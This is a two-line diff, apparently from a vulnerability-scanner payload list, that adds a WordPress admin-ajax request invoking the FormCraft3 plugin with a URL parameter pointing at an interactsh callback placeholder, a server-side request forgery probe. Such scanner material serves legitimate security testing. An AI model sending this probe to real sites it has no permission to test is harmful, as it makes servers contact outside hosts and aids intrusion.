@@ -1,0 +1,2 @@
+
+/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
